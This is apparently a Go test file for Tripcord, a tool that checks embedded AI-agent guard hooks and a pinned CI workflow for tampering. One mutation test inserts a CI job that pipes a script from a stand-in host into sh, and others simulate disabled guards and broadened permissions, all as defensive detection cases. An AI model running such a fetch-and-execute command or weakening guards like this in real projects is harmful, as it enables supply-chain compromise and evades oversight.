package embedded

import (
	"encoding/json"
	"maps"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"go.yaml.in/yaml/v3"

	"github.com/vgmartinez/tripcord/internal/model"
)

func TestKnownWorkflowPinsShape(t *testing.T) {
	seen := map[string]bool{}
	for _, pin := range KnownWorkflowPins {
		switch {
		case !IsCommitSHA(pin):
			t.Errorf("KnownWorkflowPins: %q is not a full lowercase commit SHA", pin)
		case seen[pin]:
			t.Errorf("KnownWorkflowPins: %s twice", pin)
		case pin == WorkflowPin:
			t.Errorf("KnownWorkflowPins holds WorkflowPin %s: append the pin a repin replaces, not the new one", pin)
		case slices.Contains(ExcludedWorkflowPins, pin):
			t.Errorf("KnownWorkflowPins holds %s, whose tripcord-pr.yml runs an action without the embed check", pin)
		}
		seen[pin] = true
	}
	want := append([]string{WorkflowPin}, KnownWorkflowPins...)
	slices.Sort(want)
	if got := slices.Sorted(maps.Keys(KnownRenders())); !slices.Equal(got, want) {
		t.Fatalf("known_renders.json pins = %v, want {WorkflowPin} ∪ KnownWorkflowPins = %v: run go run ./scripts/knownrenders", got, want)
	}
}

func TestKnownRendersIncludeCurrent(t *testing.T) {
	if !KnownRenders()[WorkflowPin].Includes(CurrentRenders()) {
		t.Fatal("known_renders.json lacks what this init writes: run go run ./scripts/knownrenders (a template change also needs a new WorkflowPin)")
	}
}

func TestInvariantsHoldForInit(t *testing.T) {
	for _, harnesses := range [][]model.Harness{nil, {model.HarnessClaude}, {model.HarnessCursor}, {model.HarnessCopilot}} {
		dir := embed(t, harnesses...)
		raw := []byte(readFile(t, dir, BootstrapPath))
		m, ok := parseManifest([]byte(readFile(t, dir, ManifestPath)))
		if !ok {
			t.Fatal("manifest does not parse")
		}
		if id := bootstrapInvariant(raw, &m); id != "" {
			t.Errorf("%v: bootstrap.sh breaks %s", harnesses, id)
		}
		if id := workflowInvariant([]byte(readFile(t, dir, WorkflowPath))); id != "" {
			t.Errorf("%v: tripcord.yml breaks %s", harnesses, id)
		}
		for _, h := range HookHarnesses {
			for _, e := range HookEntries(h) {
				if id := hookInvariant(h, e.Event, e.entry); id != "" {
					t.Errorf("%s %s breaks %s", h, e.Event, id)
				}
			}
		}
		if id := stepInvariant(copilotStepYAML(t)); id != "" {
			t.Errorf("copilot step breaks %s", id)
		}
	}
}

func copilotStepYAML(t *testing.T) *yaml.Node {
	t.Helper()
	dir := embedCloud(t, model.HarnessCopilot)
	steps, ok := setupSteps(file{raw: []byte(readFile(t, dir, CopilotSetupStepsPath))})
	if !ok {
		t.Fatal("setup steps do not parse")
	}
	for _, s := range steps {
		if isCopilotStep(s) {
			return s
		}
	}
	t.Fatal("no Tripcord step")
	return nil
}

// rerecord rewrites every digest embed.json records to what dir now
// holds, as a newer init that wrote dir would have.
func rerecord(t *testing.T, dir string) {
	t.Helper()
	raw := []byte(readFile(t, dir, ManifestPath))
	var m Manifest
	if err := json.Unmarshal(raw, &m); err != nil {
		t.Fatal(err)
	}
	s := string(raw)
	head := &revision{files: map[string]file{}}
	for _, p := range checkedPaths {
		if b, err := os.ReadFile(filepath.Join(dir, filepath.FromSlash(p))); err == nil {
			head.files[p] = file{raw: b}
		}
	}
	for _, f := range m.Files {
		var now string
		switch {
		case f.Step != "":
			steps, _ := setupSteps(head.files[f.Path])
			for _, step := range steps {
				if n := yamlNode(step); namesTripcord(n) {
					now = n.digest()
				}
			}
		default:
			now = digest(head.files[f.Path].raw)
		}
		if now != "" {
			s = strings.ReplaceAll(s, f.SHA256, now)
		}
	}
	for _, hook := range m.Hooks {
		hooks, _ := head.hooks(model.Harness(hook.Harness))
		list, _ := hooks[hook.Event].([]any)
		for _, v := range list {
			if n := anyNode(v); namesTripcord(n) {
				s = strings.ReplaceAll(s, hook.SHA256, hookDigest(hook.Event, n))
			}
		}
	}
	write(t, dir, ManifestPath, s)
}

const unknownPin = "1234567890abcdef1234567890abcdef12345678"

func repinWorkflow(t *testing.T, dir, pin string) {
	t.Helper()
	write(t, dir, WorkflowPath, strings.ReplaceAll(strings.ReplaceAll(readFile(t, dir, WorkflowPath), WorkflowPin, pin), WorkflowPin[:7], pin[:7]))
}

// newerEmbed applies a benign change a later init could make to every
// surface, records it, and pins an unknown tripcord-pr.yml.
func newerEmbed(t *testing.T) string {
	t.Helper()
	dir := embedCloud(t)
	replace(t, dir, BootstrapPath, "set -eu\n", "set -eu\n# written by a later Tripcord\n")
	replace(t, dir, ClaudeSettingsPath, `"onFailure": "block"`, `"onFailure": "block", "timeout": 30`)
	replace(t, dir, ClaudeSettingsPath, `session-start --harness claude"`, `session-start --harness claude", "timeout": 300`)
	replace(t, dir, CursorHooksPath, `"failClosed": true`, `"failClosed": true, "timeout": 30`)
	replace(t, dir, CopilotHooksPath, `"timeoutSec": 60`, `"timeoutSec": 90`)
	replace(t, dir, WorkflowPath, "\non:\n", "\n# written by a later Tripcord\non:\n")
	repinWorkflow(t, dir, unknownPin)
	rerecord(t, dir)
	return dir
}

func states(hits []guardHit) map[string]string {
	out := map[string]string{}
	for _, h := range hits {
		out[string(h.harness)+" "+h.subject] = h.state
	}
	return out
}

func TestCheckNewerEmbed(t *testing.T) {
	dir := newerEmbed(t)
	base := snapshotBase(t, dir)
	exec := &WorkflowRef{Repository: "vgmartinez/tripcord", Path: ReusableWorkflowPath, SHA: unknownPin}
	unverified := map[string]string{
		"generic bootstrap":          StateUnverified,
		"claude PreToolUse":          StateUnverified,
		"claude SessionStart":        StateUnverified,
		"cursor preToolUse":          StateUnverified,
		"copilot preToolUse":         StateUnverified,
		"generic workflow-pin":       StateUnverified,
		"generic workflow":           StateUnverified,
		"cursor sessionStart":        "",
		"copilot sessionStart":       "",
		"copilot setup-step":         "",
		"generic manifest":           "",
		"generic gitattributes":      "",
		"generic manifest-pin":       "",
		"generic manifest-harnesses": "",
	}
	for name, tc := range map[string]struct {
		opts CheckOptions
		pin  string
	}{
		"ci":                     {CheckOptions{Context: ContextCI}, StateUnverified},
		"ci executing no base":   {CheckOptions{Context: ContextCI, Executing: exec}, StateUnverified},
		"ci executing base":      {CheckOptions{Context: ContextCI, Executing: exec, Base: base}, ""},
		"trusted older release":  {CheckOptions{ScannerVersion: "0.0.9"}, StateUnverified},
		"trusted v-prefixed":     {CheckOptions{ScannerVersion: "v0.0.9"}, StateUnverified},
		"trusted same release":   {CheckOptions{ScannerVersion: "0.1.0"}, StatePinUnknown},
		"trusted dev":            {CheckOptions{ScannerVersion: "dev"}, StatePinUnknown},
		"trusted newer release":  {CheckOptions{ScannerVersion: "0.2.0"}, StatePinUnknown},
		"trusted prerelease 0.1": {CheckOptions{ScannerVersion: "0.1.0-rc.1"}, StatePinUnknown},
		"trusted git describe":   {CheckOptions{ScannerVersion: "0.1.0-12-gdeadbeef"}, StatePinUnknown},
	} {
		t.Run(name, func(t *testing.T) {
			got := states(checkWith(t, dir, tc.opts))
			for subject, want := range unverified {
				if subject == "generic workflow-pin" {
					want = tc.pin
				}
				if got[subject] != want {
					t.Errorf("%s = %q, want %q (all: %v)", subject, got[subject], want, got)
				}
			}
		})
	}
}

func TestCheckNewerEmbedInvariants(t *testing.T) {
	for name, tc := range map[string]struct {
		edit    func(t *testing.T, dir string)
		subject string
	}{
		"H2 onFailure continue": {func(t *testing.T, dir string) {
			replace(t, dir, ClaudeSettingsPath, `"onFailure": "block"`, `"onFailure": "continue"`)
		}, "claude PreToolUse"},
		"H2 matcher narrowed": {func(t *testing.T, dir string) {
			replace(t, dir, ClaudeSettingsPath, `"matcher": "*"`, `"matcher": "Bash"`)
		}, "claude PreToolUse"},
		"H3 failClosed false": {func(t *testing.T, dir string) {
			replace(t, dir, CursorHooksPath, `"failClosed": true`, `"failClosed": false`)
		}, "cursor preToolUse"},
		"H4 timeout short": {func(t *testing.T, dir string) {
			replace(t, dir, CopilotHooksPath, `"timeoutSec": 90`, `"timeoutSec": 5`)
		}, "copilot preToolUse"},
		"H5 on-failure dropped": {func(t *testing.T, dir string) {
			replace(t, dir, CursorHooksPath, ` --on-failure block`, ``)
		}, "cursor preToolUse"},
		"H1 guard gone": {func(t *testing.T, dir string) {
			replace(t, dir, CopilotHooksPath, ` hook --harness copilot`, ` session-start --harness copilot`)
		}, "copilot preToolUse"},
		"B4 gate disabled": {func(t *testing.T, dir string) {
			replace(t, dir, BootstrapPath, `[ "$got" != "$want" ]`, `false`)
		}, "generic bootstrap"},
		"B1 no set -eu": {func(t *testing.T, dir string) {
			replace(t, dir, BootstrapPath, "set -eu\n", "")
		}, "generic bootstrap"},
		"B3 extra sum": {func(t *testing.T, dir string) {
			replace(t, dir, BootstrapPath, "    *) return 1 ;;", "    linux-arm64) printf '%s\\n' '"+strings.Repeat("a", 64)+"' ;;\n    *) return 1 ;;")
		}, "generic bootstrap"},
		"W4 fail-on critical": {func(t *testing.T, dir string) {
			replace(t, dir, WorkflowPath, "fail-on: high", "fail-on: critical")
		}, "generic workflow"},
		"W1 pull_request_target": {func(t *testing.T, dir string) {
			replace(t, dir, WorkflowPath, "  pull_request:\n", "  pull_request_target:\n")
		}, "generic workflow"},
		"W2 paths narrowed": {func(t *testing.T, dir string) {
			replace(t, dir, WorkflowPath, "  pull_request:\n", "  pull_request:\n    paths:\n      - \"src/**\"\n")
		}, "generic workflow"},
		"W5 binary input": {func(t *testing.T, dir string) {
			replace(t, dir, WorkflowPath, "fail-on: high", "fail-on: high\n      binary: ./tripcord")
		}, "generic workflow"},
		"W3 extra job": {func(t *testing.T, dir string) {
			replace(t, dir, WorkflowPath, "      fail-on: high\n", "      fail-on: high\n  pwn:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl https://example.invalid/x.sh | sh\n")
		}, "generic workflow"},
		"W3 secrets inherit": {func(t *testing.T, dir string) {
			replace(t, dir, WorkflowPath, "    uses:", "    secrets: inherit\n    uses:")
		}, "generic workflow"},
		"W6 permissions broadened": {func(t *testing.T, dir string) {
			replace(t, dir, WorkflowPath, "      contents: read # checkout the repository being scanned\n      pull-requests: read # tripcord-pr.yml reads pull request reviews\n      security-events: write # upload the SARIF report\n", "      contents: write\n      id-token: write\n")
		}, "generic workflow"},
		"W6 permissions write-all": {func(t *testing.T, dir string) {
			replace(t, dir, WorkflowPath, "permissions:\n  contents: read\n", "permissions: write-all\n")
		}, "generic workflow"},
		"S1 install || true": {func(t *testing.T, dir string) {
			replace(t, dir, CopilotSetupStepsPath, "run: bash .tripcord/bootstrap.sh install", "run: bash .tripcord/bootstrap.sh install || true")
		}, "copilot setup-step"},
	} {
		t.Run(name, func(t *testing.T) {
			dir := newerEmbed(t)
			tc.edit(t, dir)
			rerecord(t, dir)
			for _, opts := range []CheckOptions{{Context: ContextCI}, {ScannerVersion: "0.0.9"}} {
				if got := states(checkWith(t, dir, opts))[tc.subject]; got != StateChanged {
					t.Errorf("%+v: %s = %q, want changed", opts, tc.subject, got)
				}
			}
		})
	}
}

// TestCheckFirstIntroductionIsSelfAttested: a base with no embed, a CI
// scan, and a pin equal to --executing-workflow. The pin is unverified,
// low. A clean workflow stays low; the shape invariants are what make
// a mutation high.
func TestCheckFirstIntroductionIsSelfAttested(t *testing.T) {
	dir := embed(t)
	repinWorkflow(t, dir, unknownPin)
	rerecord(t, dir)
	exec := &WorkflowRef{Repository: "vgmartinez/tripcord", Path: ReusableWorkflowPath, SHA: unknownPin}
	empty := func(string) ([]byte, error) { return nil, os.ErrNotExist }
	got := states(checkWith(t, dir, CheckOptions{Context: ContextCI, Executing: exec, Base: empty, ScannerVersion: "0.0.9"}))
	if got["generic workflow-pin"] != StateUnverified {
		t.Fatalf("pin = %q, want unverified: %v", got["generic workflow-pin"], got)
	}
	for subject, state := range got {
		if state == StateChanged || state == StatePinUnknown || state == StatePinMalformed || state == StateRepinned {
			t.Fatalf("%s = %s on a clean first introduction: %v", subject, state, got)
		}
	}
}

// TestCheckWriterWitness: a render this scanner never compiled, under a
// pin it knows, cannot come from that pin's init.
func TestCheckWriterWitness(t *testing.T) {
	dir := newerEmbed(t)
	repinWorkflow(t, dir, unknownPin)
	write(t, dir, WorkflowPath, strings.ReplaceAll(strings.ReplaceAll(readFile(t, dir, WorkflowPath), unknownPin, WorkflowPin), unknownPin[:7], WorkflowPin[:7]))
	rerecord(t, dir)
	got := states(checkWith(t, dir, CheckOptions{Context: ContextCI}))
	for _, subject := range []string{"generic bootstrap", "claude PreToolUse", "claude SessionStart", "cursor preToolUse", "copilot preToolUse"} {
		if got[subject] != StateChanged {
			t.Errorf("%s = %q, want changed (witness); all: %v", subject, got[subject], got)
		}
	}
	if got["generic workflow-pin"] != "" {
		t.Errorf("current pin reported: %v", got)
	}
}

func TestCheckWorkflowPins(t *testing.T) {
	saved := KnownWorkflowPins
	t.Cleanup(func() { KnownWorkflowPins = saved })
	const earlier = "abcdefabcdefabcdefabcdefabcdefabcdefabcd"
	KnownWorkflowPins = []string{earlier}
	for name, tc := range map[string]struct {
		uses    string
		opts    CheckOptions
		want    string
		useBase bool
	}{
		"current":           {WorkflowPin, CheckOptions{}, "", false},
		"known earlier":     {earlier, CheckOptions{Context: ContextCI}, StateOutdated, false},
		"unknown trusted":   {unknownPin, CheckOptions{}, StatePinUnknown, false},
		"unknown ci":        {unknownPin, CheckOptions{Context: ContextCI}, StateUnverified, false},
		"short":             {WorkflowPin[:7], CheckOptions{Context: ContextCI}, StatePinMalformed, false},
		"uppercase":         {strings.ToUpper(WorkflowPin), CheckOptions{}, StatePinMalformed, false},
		"branch":            {"main", CheckOptions{}, StatePinMalformed, false},
		"tag":               {"v0.1.0", CheckOptions{Context: ContextCI}, StatePinMalformed, false},
		"executing no base": {unknownPin, CheckOptions{Context: ContextCI, Executing: &WorkflowRef{SHA: unknownPin}}, StateUnverified, false},
		// Under pull_request the PR's own tripcord.yml picks the
		// workflow that runs, so the flag only accepts a pin the base
		// already had; a fork-network SHA in both is the documented
		// self-attestation limit.
		"executing in base": {unknownPin, CheckOptions{Context: ContextCI, Executing: &WorkflowRef{SHA: unknownPin}}, "", true},
		"executing other":   {unknownPin, CheckOptions{Context: ContextCI, Executing: &WorkflowRef{SHA: earlier}}, StateUnverified, true},
	} {
		t.Run(name, func(t *testing.T) {
			dir := embed(t)
			write(t, dir, WorkflowPath, strings.Replace(readFile(t, dir, WorkflowPath), "tripcord-pr.yml@"+WorkflowPin, "tripcord-pr.yml@"+tc.uses, 1))
			rerecord(t, dir)
			opts := tc.opts
			if tc.useBase {
				opts.Base = snapshotBase(t, dir)
			}
			if got := states(checkWith(t, dir, opts))["generic workflow-pin"]; got != tc.want {
				t.Fatalf("workflow-pin = %q, want %q", got, tc.want)
			}
		})
	}
}

// TestCheckWorkflowRepinnedVsBase: a pin change is repinned (high) even
// when it is what --executing-workflow says is running.
func TestCheckWorkflowRepinnedVsBase(t *testing.T) {
	dir := embed(t)
	base := snapshotBase(t, dir)
	repinWorkflow(t, dir, unknownPin)
	rerecord(t, dir)
	opts := CheckOptions{Context: ContextCI, Base: base, Executing: &WorkflowRef{SHA: unknownPin}}
	if got := states(checkWith(t, dir, opts))["generic workflow-pin"]; got != StateRepinned {
		t.Fatalf("workflow-pin = %q, want repinned", got)
	}
}

func TestCheckFutureSchema(t *testing.T) {
	dir := embed(t)
	base := snapshotBase(t, dir)
	replace(t, dir, ManifestPath, `"tripcord.embed/v1"`, `"tripcord.embed/v2"`)
	got := states(check(t, dir))
	if got["generic manifest"] != StateUnverified || len(got) != 1 {
		t.Fatalf("hits = %v, want only manifest unverified", got)
	}
	if got := states(checkWith(t, dir, CheckOptions{Base: base})); got["generic manifest-pin"] != StateRepinned {
		t.Fatalf("schema change vs base: %v", got)
	}
	replace(t, dir, ClaudeSettingsPath, `"onFailure": "block"`, `"onFailure": "continue"`)
	rerecord(t, dir)
	if got := states(check(t, dir)); got["claude PreToolUse"] != StateChanged {
		t.Fatalf("v2 does not skip invariants: %v", got)
	}
}

func TestCheckUnrecordedEvent(t *testing.T) {
	dir := embed(t, model.HarnessClaude)
	var m Manifest
	if err := json.Unmarshal([]byte(readFile(t, dir, ManifestPath)), &m); err != nil {
		t.Fatal(err)
	}
	m.Hooks = slices.DeleteFunc(m.Hooks, func(h ManifestHook) bool { return h.Event == "SessionStart" })
	raw, err := json.MarshalIndent(m, "", "  ")
	if err != nil {
		t.Fatal(err)
	}
	write(t, dir, ManifestPath, string(raw)+"\n")
	write(t, dir, ClaudeSettingsPath, strings.Replace(readFile(t, dir, ClaudeSettingsPath), "SessionStart", "Unused", 1))
	got := states(check(t, dir))
	if got["claude SessionStart"] != StateUnverified || got["claude PreToolUse"] != "" {
		t.Fatalf("hits = %v", got)
	}
	write(t, dir, ClaudeSettingsPath, strings.Replace(readFile(t, dir, ClaudeSettingsPath), "PreToolUse", "Unused2", 1))
	if got := states(check(t, dir)); got["claude PreToolUse"] != StateMissing {
		t.Fatalf("the pre-tool guard is the floor: %v", got)
	}
}

func TestParseWorkflowRef(t *testing.T) {
	good := "vgmartinez/tripcord/.github/workflows/tripcord-pr.yml@" + WorkflowPin
	if r, err := ParseWorkflowRef(good); err != nil || r.SHA != WorkflowPin || r.Path != ReusableWorkflowPath {
		t.Fatalf("ParseWorkflowRef(%q) = %+v, %v", good, r, err)
	}
	for _, bad := range []string{
		"",
		"vgmartinez/tripcord/.github/workflows/tripcord-pr.yml@",
		"vgmartinez/tripcord/.github/workflows/tripcord-pr.yml@" + WorkflowPin[:7],
		"vgmartinez/tripcord/.github/workflows/tripcord-pr.yml@" + strings.ToUpper(WorkflowPin),
		"vgmartinez/tripcord/.github/workflows/tripcord-pr.yml@main",
		"someone-else/tripcord/.github/workflows/tripcord-pr.yml@" + WorkflowPin,
		"vgmartinez/tripcord/.github/workflows/tripcord.yml@" + WorkflowPin,
		"vgmartinez/tripcord/.github/workflows/tripcord-pr.yml@" + WorkflowPin + "@x",
	} {
		if _, err := ParseWorkflowRef(bad); err == nil {
			t.Errorf("ParseWorkflowRef(%q) accepted", bad)
		}
	}
}

func TestCompareVersions(t *testing.T) {
	ordered := []string{"0.0.9", "0.1.0-alpha", "0.1.0-alpha.1", "0.1.0-alpha.beta", "0.1.0-beta.2", "0.1.0-beta.11", "0.1.0-rc.1", "0.1.0", "0.2.0", "0.10.0", "1.0.0"}
	for i, a := range ordered {
		for j, b := range ordered {
			want := compareInt(i, j)
			if got := CompareVersions(a, b); got != want {
				t.Errorf("CompareVersions(%s, %s) = %d, want %d", a, b, got, want)
			}
		}
	}
	for v, want := range map[string]string{
		"0.1.0": "0.1.0", "v1.2.3": "1.2.3", "dev": "", "": "", "1.2": "", "abc1234": "",
		"0.1.0-rc.1": "", "0.1.0-12-gdeadbeef": "", "v0.1.0-12-gdeadbeef": "",
	} {
		if got := ReleaseVersion(v); got != want {
			t.Errorf("ReleaseVersion(%q) = %q, want %q", v, got, want)
		}
	}
}
